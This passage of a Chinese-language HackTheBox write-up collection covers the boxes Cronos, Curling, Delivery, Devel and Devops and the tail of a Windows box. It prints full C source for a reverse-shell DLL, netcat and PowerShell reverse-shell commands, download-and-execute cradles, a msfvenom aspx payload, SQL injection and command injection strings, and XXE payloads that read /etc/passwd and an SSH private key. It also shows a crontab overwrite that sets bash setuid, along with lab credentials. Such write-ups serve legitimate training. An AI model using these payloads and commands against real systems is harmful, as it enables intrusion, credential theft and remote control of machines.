<p>之后就可以弹shell回来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\USers\Destitute\Music\JuicyPotato.exe -t * -p C:\USers\Destitute\Music\evil.bat -l 2500 -c &#39;&#123;e60687f7-01a1-40aa-86ac-db1cbf673334&#125;&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/13.jpg" alt="13"></p>
<h3 id="CVE-2018-8440"><a href="#CVE-2018-8440" class="headerlink" title="CVE-2018-8440"></a>CVE-2018-8440</h3><p>使用watson V0.1版本发现了alpc漏洞(注意这里watson必须选用V0.1版本才能检测CVE-2018-8440)</p>
<p><img src="/images/conceal/15.png" alt="15"></p>
<p>手动检测这个漏洞检查<code>c:\windows\tasks</code>是否具有RX权限</p>
<p><img src="/images/conceal/16.png" alt="16"></p>
<p>msf可以快速完成Exploit</p>
<p><img src="/images/conceal/14.png" alt="14"></p>
<p>手动完成也不复杂，编译rev.dll</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;x86_64-w64-mingw32-g++ shell.cpp -o payload.dll -lws2_32 -shared</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;process.h&gt;</span><br><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;ws2tcpip.h&gt;</span><br><span class="line">#pragma comment(lib, &quot;Ws2_32.lib&quot;)</span><br><span class="line">#define DEFAULT_BUFLEN 1024</span><br><span class="line">void revShell();</span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">        switch(dwReason)</span><br><span class="line">                &#123;</span><br><span class="line">                        case DLL_PROCESS_ATTACH:</span><br><span class="line">                                revShell();</span><br><span class="line">                                break;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        case DLL_PROCESS_DETACH:</span><br><span class="line">                                break;</span><br><span class="line"></span><br><span class="line">                        case DLL_THREAD_ATTACH:</span><br><span class="line">                                break;</span><br><span class="line"></span><br><span class="line">                        case DLL_THREAD_DETACH:</span><br><span class="line">                                break;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                        return 0;</span><br><span class="line">&#125;</span><br><span class="line">void revShell() &#123;</span><br><span class="line">        Sleep(1000); &#x2F;&#x2F; 1000 &#x3D; One Second</span><br><span class="line">        SOCKET mySocket;</span><br><span class="line">        sockaddr_in addr;</span><br><span class="line">        WSADATA version;</span><br><span class="line">        WSAStartup(MAKEWORD(2,2), &amp;version);</span><br><span class="line">        mySocket &#x3D; WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned</span><br><span class="line">int)NULL, (unsigned int)NULL);</span><br><span class="line">        addr.sin_family &#x3D; AF_INET;</span><br><span class="line">        addr.sin_addr.s_addr &#x3D; inet_addr(&quot;192.168.110.2&quot;); &#x2F;&#x2F; Change IP</span><br><span class="line">        addr.sin_port &#x3D; htons(4444); &#x2F;&#x2F;Change port</span><br><span class="line">        &#x2F;&#x2F;Connecting to Proxy&#x2F;ProxyIP&#x2F;C2Host</span><br><span class="line">        if (WSAConnect(mySocket, (SOCKADDR*)&amp;addr, sizeof(addr), NULL, NULL,</span><br><span class="line">NULL, NULL)&#x3D;&#x3D;SOCKET_ERROR) &#123;</span><br><span class="line">                closesocket(mySocket);</span><br><span class="line">                WSACleanup();</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">                char RecvData[DEFAULT_BUFLEN];</span><br><span class="line">                memset(RecvData, 0, sizeof(RecvData));</span><br><span class="line">                int RecvCode &#x3D; recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);</span><br><span class="line">                if (RecvCode &lt;&#x3D; 0) &#123;</span><br><span class="line">                        closesocket(mySocket);</span><br><span class="line">                        WSACleanup();</span><br><span class="line">                &#125;</span><br><span class="line">                else &#123;</span><br><span class="line">                        char Process[] &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line">                        STARTUPINFO sinfo;</span><br><span class="line">                        PROCESS_INFORMATION pinfo;</span><br><span class="line">                        memset(&amp;sinfo, 0, sizeof(sinfo));</span><br><span class="line">                        sinfo.cb &#x3D; sizeof(sinfo);</span><br><span class="line">                        sinfo.dwFlags &#x3D; (STARTF_USESTDHANDLES |</span><br><span class="line">STARTF_USESHOWWINDOW);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        sinfo.hStdInput &#x3D; sinfo.hStdOutput &#x3D; sinfo.hStdError &#x3D;</span><br><span class="line">(HANDLE) mySocket;</span><br><span class="line">                        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL,</span><br><span class="line">NULL, &amp;sinfo, &amp;pinfo);</span><br><span class="line"></span><br><span class="line">                        WaitForSingleObject(pinfo.hProcess, INFINITE);</span><br><span class="line">                        CloseHandle(pinfo.hProcess);</span><br><span class="line">                        CloseHandle(pinfo.hThread);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        memset(RecvData, 0, sizeof(RecvData));</span><br><span class="line">                        int RecvCode &#x3D; recv(mySocket, RecvData, DEFAULT_BUFLEN,</span><br><span class="line">0);</span><br><span class="line">                        if (RecvCode &lt;&#x3D; 0) &#123;</span><br><span class="line">                        closesocket(mySocket);</span><br><span class="line">                        WSACleanup();</span><br><span class="line">                        &#125;</span><br><span class="line">                        if (strcmp(RecvData, &quot;exit\n&quot;) &#x3D;&#x3D; 0) &#123;</span><br><span class="line">                        exit(0);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将文件dll和ALPC_DiagHub.x64.exe上传后执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd.exe &#x2F;c ALPC_DiagHub.x64.exe rev.dll lol.rtf</span><br></pre></td></tr></table></figure>

<p><img src="/images/conceal/17.png" alt="17"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Cronos</title>
    <url>/2020/06/12/HTB-Cronos/</url>
    <content><![CDATA[<h1 id="Cronos"><a href="#Cronos" class="headerlink" title="Cronos"></a>Cronos</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Cronos/1.jpg" alt="1"></p>
<p>发现目标存在ssh，dns，http三个服务</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>首先访问目标ip</p>
<p><img src="/images/Cronos/2.jpg" alt="2"></p>
<p>出现apache默认页面<br>之后进行了目录扫描，但一无所获，看来是要要配置host</p>
<p><img src="/images/Cronos/3.jpg" alt="3"></p>
<p>配置完hosts后页面变成了这样</p>
<p><img src="/images/Cronos/4.jpg" alt="4"></p>
<p>不过当前页面的链接已经不在cronos.htb，运行目录扫描也没发现有价值的信息</p>
<h4 id="dns区域传输"><a href="#dns区域传输" class="headerlink" title="dns区域传输"></a>dns区域传输</h4><p>我想尝试进行子域名枚举，首先尝试dns区域传输，如果没有发现再尝试layer之类的子域名扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @10.10.10.13 cronos.htb axfr</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cronos/5.jpg" alt="5"></p>
<p>运气很好，成功进行了区域传输</p>
<p>接着把子域名添加到hosts里进行dns解析</p>
<p><img src="/images/Cronos/6.jpg" alt="6"></p>
<p>之后访问子域名</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><img src="/images/Cronos/7.jpg" alt="7"></p>
<p>发现了一个登录页面，尝试sql注入<br>payload:<code>1&#39; or 1=1#</code></p>
<p><img src="/images/Cronos/8.jpg" alt="8"></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>这页面一看就是可能存在命令执行</p>
<p>我们可以尝试payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.8.8.8;whoami</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cronos/9.jpg" alt="9"></p>
<p>盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.8.8.8;sleep 5s</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cronos/10.jpg" alt="10"></p>
<p>观察时间</p>
<p><img src="/images/Cronos/11.jpg" alt="11"></p>
<p>可以发现，命令是执行了，所以现在我们只要执行反弹shell指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">8.8.8.8;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 10.10.16.123 4444 1&gt;&#x2F;tmp&#x2F;f</span><br></pre></td></tr></table></figure>

<p><img src="/images/Cronos/12.jpg" alt="12"></p>
<p>成功getshell</p>
<p>升级shell为全交互式shell</p>
<p><img src="/images/Cronos/13.jpg" alt="13"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">Ctrl+Z</span><br><span class="line">stty raw -echo</span><br><span class="line">reset</span><br><span class="line">xterm-color</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>执行提权脚本</p>
<p><img src="/images/Cronos/15.jpg" alt="15"></p>
<p><img src="/images/Cronos/14.jpg" alt="14"></p>
<p>在系统中发现了以root运行的计划任务<br>并且我们对该文件具有w权限</p>
<p>用我们的php shell替换artisan即可</p>
<p><img src="/images/Cronos/16.jpg" alt="16"></p>
<p>成果获取root</p>
<p>内核提权<code>44298.c</code>也是可以的</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Curling</title>
    <url>/2021/05/11/HTB-Curling/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Curling/1.png" alt="1"></p>
<p>80端口发现PHP的web应用，文章的作者是<code>Floris</code></p>
<p><img src="/images/Curling/2.png" alt="2"></p>
<p>尝试枚举</p>
<p><img src="/images/Curling/3.png" alt="3"></p>
<p>发现了网站后台</p>
<p><img src="/images/Curling/4.png" alt="4"></p>
<p>网站的应用是Joomla</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>joomla有个很好的枚举工具joomscan</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">joomscan -u http:&#x2F;&#x2F;10.10.10.150&#x2F;</span><br></pre></td></tr></table></figure>

<p>除了版本以外没有太多发现</p>
<p><img src="/images/Curling/5.png" alt="5"></p>
<p>版本的发现很有兴趣，通过搜索已经有人上报了这个漏洞:<a href="https://forum.joomla.org/viewtopic.php?t=911138">链接</a> 通过这篇文章，我们可以快速版本号等信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.10.10.150&#x2F;administrator&#x2F;manifests&#x2F;files&#x2F;joomla.xml</span><br></pre></td></tr></table></figure>

<p><img src="/images/Curling/6.png" alt="6"></p>
<p>之后的步骤有些隐蔽，源码中的注释提示了文件</p>
<p><img src="/images/Curling/7.png" alt="7"></p>
<p>查看它</p>
<p><img src="/images/Curling/8.png" alt="8"></p>
<p>该字符串能被4整除，尝试base64解码得到<code>Curling2018!</code></p>
<p><img src="/images/Curling/9.png" alt="9"></p>
<p>由于页面提示了cewl，所以用cewl抓取密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cewl http:&#x2F;&#x2F;10.10.10.150&#x2F;index.php -m 4 -w dict.txt -d 1</span><br></pre></td></tr></table></figure>

<p>可以使用ffuf和wfuzz对其进行爆破</p>
<p>ffuf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ffuf -w dict.txt -x http:&#x2F;&#x2F;127.0.0.1:8080 -X POST -d &quot;username&#x3D;FUZZ&amp;passwd&#x3D;Curling2018%21&amp;option&#x3D;com_login&amp;task&#x3D;login&amp;return&#x3D;aW5kZXgucGhw&amp;494f904a938cdf6398ba9c47a7043642&#x3D;1&quot; -u http:&#x2F;&#x2F;10.10.10.150&#x2F;administrator&#x2F;index.php -b &quot;99fb082d992a92668ce87e5540bd20fa&#x3D;9liihfdo9t2e84vpfgqrf12o03&quot; -H &quot;Content-Type: application&#x2F;x-www-form-urlencoded&quot; -mc all -fc 200</span><br></pre></td></tr></table></figure>

<p>wfuzz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wfuzz -w dict.txt -d &quot;username&#x3D;FUZZ&amp;passwd&#x3D;Curling2018%21&amp;option&#x3D;com_login&amp;task&#x3D;login&amp;return&#x3D;aW5kZXgucGhw&amp;494f904a938cdf6398ba9c47a7043642&#x3D;1&quot; -u http:&#x2F;&#x2F;10.10.10.150&#x2F;administrator&#x2F;index.php -b &quot;99fb082d992a92668ce87e5540bd20fa&#x3D;9liihfdo9t2e84vpfgqrf12o03&quot; --fc 200</span><br></pre></td></tr></table></figure>

<p>ffuf用的少，这里有两个坑需要注意。第一个是和wfuzz不同，fuff的post请求不会携带Content-Type请求头，这会造成后端解析上出现一些问题，参考RFC2616，而wfuzz默认会携带它。另一个是这里正确登陆后，返回的状态码为303，而ffuf默认显示200,204,301,302,307,401,403,405，所以需要参数-mc all</p>
<p><img src="/images/Curling/10.png" alt="10"></p>
<p>这里正确的凭据是<code>Floris/Curling2018!</code>，cookie是被重新生成了，而不是登陆状体，不知道为什么会多显示2个。。神奇</p>
<p>后台登陆权限为管理员，就像WordPress一样，我们可以修改模板(Templates)来获取RCE</p>
<p><img src="/images/Curling/11.png" alt="11"></p>
<p>随便选一个模板，新建shell.php添加webshell，路径位于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;IP&#x2F;templates&#x2F;$TEMPLATES_NAME&#x2F;xxx.php</span><br></pre></td></tr></table></figure>

<p>或者你实在找不到路径，修改当前网站使用的模板，然后修改index.php，也是可以立即生效的</p>
<p><img src="/images/Curling/12.png" alt="12"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="user"><a href="#user" class="headerlink" title="user"></a>user</h2><p><img src="/images/Curling/13.png" alt="13"></p>
<p>发现了备份文件，看样子格式变成了16进制</p>
<p><img src="/images/Curling/14.png" alt="14"></p>
<p>使用xxd将它反转，并重定向</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">xxd -r &#x2F;home&#x2F;floris&#x2F;password_backup &gt; &#x2F;tmp&#x2F;backup</span><br></pre></td></tr></table></figure>

<p><img src="/images/Curling/15.png" alt="15"></p>
<p>新文件的格式为bzip2，解压它就好，之后是套娃，一直解压就好，注意解压前先修改文件格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bzip2 -d &#x2F;tmp&#x2F;backup</span><br><span class="line">mv backup.out backup.gz</span><br><span class="line">gunzip -d backup.giz</span><br><span class="line">bzip2 -d backup</span><br><span class="line">mv backup.out backup.tar</span><br><span class="line">tar xvf backup.tar</span><br></pre></td></tr></table></figure>

<p>最后得到password.txt</p>
<p><img src="/images/Curling/16.png" alt="16"></p>
<p>得到密码<code>5d&lt;wdCbdZu)|hChXll</code>，之后可以ssh到floris</p>
<p><img src="/images/Curling/17.png" alt="17"></p>
<h2 id="root"><a href="#root" class="headerlink" title="root"></a>root</h2><p>pspy发现了奇怪的进程</p>
<p><img src="/images/Curling/18.png" alt="18"></p>
<p>这是由root执行，我们可以对input文件进行修改，并且-K参数的意思可以从manual中了解</p>
<p><img src="/images/Curling/19.png" alt="19"></p>
<p>并且输出保存到report，因此我们已经可以读取任意文件，利用<code>curl file:///etc/shadow</code></p>
<p>所有可以修改input的内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Curling/20.png" alt="20"></p>
<p>为了获取root shell，我们可以在config file里添加output参数，来覆盖文件，比如passwd，sudoers等</p>
<p>这里为了有趣决定覆盖crontab，这样可以达成root权限下的RCE</p>
<p>在本地创建evil.txt，主要内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* * * * * root chmod +s &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<p>修改对方的input，内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;10.10.16.12&#x2F;evil.txt&quot;output &#x3D; &quot;&#x2F;etc&#x2F;crontab&quot;</span><br></pre></td></tr></table></figure>

<p>开启http服务，先等待curl覆盖crontab文件，再等待crontab触发就行了</p>
<p><img src="/images/Curling/21.png" alt="21"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Delivery</title>
    <url>/2021/01/10/HTB-Delivery/</url>
    <content><![CDATA[<p><img src="/images/Delivery/1.png" alt="1"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><img src="/images/Delivery/2.png" alt="2"></p>
<p>访问80端口，发现hosts</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">10.129.52.120	delivery.htb helpdesk.delivery.htb</span><br></pre></td></tr></table></figure>

<p>得到提示</p>
<p><img src="/images/Delivery/3.png" alt="3"></p>
<p>点进去发现web应用，delivery.htb运行着OSticket，helpdesk.delivery.htb运行着Mattermost</p>
<p>感觉这里就是第一坑，这台机器不需要CVE</p>
<h1 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h1><p>这一步主要是弄明白业务逻辑</p>
<p>遵循第一个提示可以知道，我们应该在Mattermost注册一个<code>@delivery.htb</code>的邮箱，但是注册需要访问带有token的邮件来确认邮箱，这个目前是做不到的，可以利用OSticket来完成，首先通过OSticket来后台留个言，这一步的信息随便输</p>
<p><img src="/images/Delivery/4.png" alt="4"></p>
<p>之后会返回一个它自己域的邮箱地址，如果后续有问题，可以联系这个邮箱</p>
<p><img src="/images/Delivery/5.png" alt="5"></p>
<p>我们可以输入邮箱和这个工单号来查询跟进这个消息</p>
<p><img src="/images/Delivery/6.png" alt="6"></p>
<p>里面就是之前的留言消息了</p>
<p>(这里可以上传php shell，但是找不到位置)</p>
<p><img src="/images/Delivery/7.png" alt="7"></p>
<p>下一步就很有意思了，在Mattermost的注册页面，输入刚刚返回订单号的邮箱<code>8400379@delivery.htb</code></p>
<p>刷新上一步订单号的页面，发现收到了验证注册的邮件内容</p>
<p><img src="/images/Delivery/8.png" alt="8"></p>
<p>看来是服务端自己给自己发的邮件，也被当成用户输入了，这样账号就注册好了</p>
<p>凭据登录，可以发现内部聊天室，里面有root的聊天记录，是一个SSH的凭据<code>maildeliverer/Youve_G0t_Mail!</code><br>另外还提醒了内部密码没有使用rockyou，但使用了<code>PleaseSubscribe!</code>的变异</p>
<p><img src="/images/Delivery/9.png" alt="9"></p>
<p>这样就得到了foothold</p>
<p><img src="/images/Delivery/10.png" alt="10"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>这里失误了，第一感觉是去找数据库，但是找错了，浪费了一段时间，第二次重新检查的时候才反应过来</p>
<p>我在<code>/var/www/osticket/upload/include/ost-config.php</code>发现了数据库凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">define(&#39;DBTYPE&#39;,&#39;mysql&#39;);</span><br><span class="line">define(&#39;DBHOST&#39;,&#39;localhost&#39;);</span><br><span class="line">define(&#39;DBNAME&#39;,&#39;osticket&#39;);</span><br><span class="line">define(&#39;DBUSER&#39;,&#39;ost_user&#39;);</span><br><span class="line">define(&#39;DBPASS&#39;,&#39;!H3lpD3sk123!&#39;);</span><br></pre></td></tr></table></figure>

<p>但里面没有可以破解的有意思的hash，之后浪费了一段时间，主要原因是都去依靠linpeas了，而且这里有一些rabbit hole，比如本地的cups cms，而正确的方向，这里linpeas并没有明显的输出</p>
<p>第二次手动枚举，我去检查了<code>/opt</code>目录，这里发现了之前的web应用Mattermost，才想起来两个web应用只找了一个数据库</p>
<p>在<code>/opt/mattermost/config</code>存在Readme.md，里面有Mattermost的官方手册，这里找到了数据库的连接字段</p>
<p><img src="/images/Delivery/11.png" alt="11"></p>
<p>这样我就发现了另一个数据库的凭据</p>
<p><img src="/images/Delivery/12.png" alt="12"></p>
<p>连接数据库后，发现了root的hash</p>
<p><img src="/images/Delivery/13.png" alt="13"></p>
<p>根据之前的提示，通过hashcat对字符串<code>PleaseSubscribe!</code>的vartations，得到字典</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat --stdout -a 0 -r &#x2F;usr&#x2F;share&#x2F;hashcat&#x2F;rules&#x2F;rockyou-30000.rule plzsub.txt  &gt; dict</span><br></pre></td></tr></table></figure>

<p>john破解即可</p>
<p><img src="/images/Delivery/14.png" alt="14"></p>
<p>当然，ssh肯定不允许root登录，要不然爆破就完事了</p>
<p><img src="/images/Delivery/15.png" alt="15"></p>
<p><strong>su root</strong>结束</p>
<p><img src="/images/Delivery/16.png" alt="16"></p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>好像如果一开始爆破su密码也不错，可以写个bash利用这条命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ars@kali:~$ echo toor |su root -c id</span><br><span class="line">Password: uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">ars@kali:~$ echo toorsss |su root -c id</span><br><span class="line">Password: su: Authentication failure</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Devel</title>
    <url>/2020/06/06/HTB-Devel/</url>
    <content><![CDATA[<h1 id="Devel"><a href="#Devel" class="headerlink" title="Devel"></a>Devel</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Devel/1.jpg" alt="1"></p>
<p>扫出ftp和http两个服务，其中ftp允许匿名登陆</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>访问http页面</p>
<p><img src="/images/Devel/2.jpg" alt="2"></p>
<p>发现了IIS的欢迎页面，不过在这其中我发现了一些细节</p>
<p>图片名为<code>welcome.png</code>，该页面链接为<code>iisstart.htm</code>，而且存在目录</p>
<p><img src="/images/Devel/3.jpg" alt="3"></p>
<p>这和ftp匿名登录分享的文件一样</p>
<p><img src="/images/Devel/4.jpg" alt="4"></p>
<p>所以可以初步断定，web服务和ftp服务工作在同一个目录</p>
<p>之后，我们可以尝试文件上传</p>
<p><img src="/images/Devel/5.jpg" alt="5"></p>
<p>文件上传成功</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="put-getshell"><a href="#put-getshell" class="headerlink" title="put getshell"></a>put getshell</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;10.10.16.132 LPORT&#x3D;4444 -f aspx -o &#x2F;root&#x2F;Desktop&#x2F;shell.aspx</span><br><span class="line">ftp&gt; put shell.aspx</span><br></pre></td></tr></table></figure>

<p>之后<code>multi/handler</code>监听→访问<code>shell.aspx</code>→getshell</p>
<p><img src="/images/Devel/6.jpg" alt="6"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Devel/7.jpg" alt="7"></p>
<p>hotfix(s)没有任何补丁</p>
<h3 id="手动提权"><a href="#手动提权" class="headerlink" title="手动提权"></a>手动提权</h3><p>修改<code>Invoke-PowerShellTcp.ps1</code>，末尾添加</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.132 -Port 5555</span><br></pre></td></tr></table></figure>

<p>kali监听5555端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 5555</span><br></pre></td></tr></table></figure>

<p>cmd shell执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Powershell iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.132&#x2F;Invoke-PowerShellTcp.ps1&#39;)</span><br></pre></td></tr></table></figure>

<p>成功获取powershell会话</p>
<p><img src="/images/Devel/10.jpg" alt="10"></p>
<p>执行sherlock提权脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;10.10.16.132&#x2F;Sherlock.ps1&#39;);Find-AllVulns</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devel/11.jpg" alt="11"></p>
<p>发现可以使用MS15-051</p>
<p>进行文件传输</p>
<p>可以使用powershell传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell -c &quot;(new-object System.Net.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.16.132&#x2F;nc.exe&#39;,&#39;c:\Windows\Temp\nc.exe&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p>也可以使用smb传输</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kali</span><br><span class="line">smbserver.py -smb2support a &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">windows</span><br><span class="line">copy \\10.10.16.132\a\ms15-051.exe</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devel/12.jpg" alt="12"></p>
<p>提权脚本运行成功，配合运行nc</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ms15-051 &quot;c:\Windows\Temp\nc.exe 10.10.16.132 6666 -e cmd&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devel/13.jpg" alt="13"></p>
<h3 id="meterpreter提权"><a href="#meterpreter提权" class="headerlink" title="meterpreter提权"></a>meterpreter提权</h3><p>multi/recon/local_exploit_suggester</p>
<p><img src="/images/Devel/8.jpg" alt="8"></p>
<p>使用提权</p>
<p><img src="/images/Devel/9.jpg" alt="9"></p>
<p>期间出现了一次崩溃，再尝试一次就好了</p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Windows靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB:Devops</title>
    <url>/2020/06/27/HTB-Devops/</url>
    <content><![CDATA[<h1 id="Devops"><a href="#Devops" class="headerlink" title="Devops"></a>Devops</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Devops/1.jpg" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>5000端口为http</p>
<p><img src="/images/Devops/2.jpg" alt="2"></p>
<p>不过该页面下没有任何发现，开始目录扫描</p>
<p><img src="/images/Devops/3.jpg" alt="3"></p>
<p>发现目录upload</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><img src="/images/Devops/4.jpg" alt="4"></p>
<p>该页面提示允许上传XML文件，而且提示了子元素名，我们可构造payload，进行XXE攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ELEMENT data (ANY)&gt;</span><br><span class="line">&lt;!ENTITY evil SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ars&gt;</span><br><span class="line">    &lt;Author&gt;hack&lt;&#x2F;Author&gt;</span><br><span class="line">    &lt;Subject&gt;hacker&lt;&#x2F;Subject&gt;</span><br><span class="line">    &lt;Content&gt;&amp;evil;&lt;&#x2F;Content&gt;</span><br><span class="line">&lt;&#x2F;Ars&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/5.jpg" alt="5"></p>
<p>成功进行了文件读取<br>考虑到开放了SSH端口，我们能利用也只有文件读取，所以尝试读取有/bin/bash用户的私钥</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY evil SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;home&#x2F;roosa&#x2F;.ssh&#x2F;id_rsa&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Devops/6.jpg" alt="6"></p>
<p>真读到了，复制key的部分  <code>----BEGIN.....----END RSA</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch id_rsa 复制过去</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa roosa@10.10.10.91</span><br></pre></td></tr></table></figure>

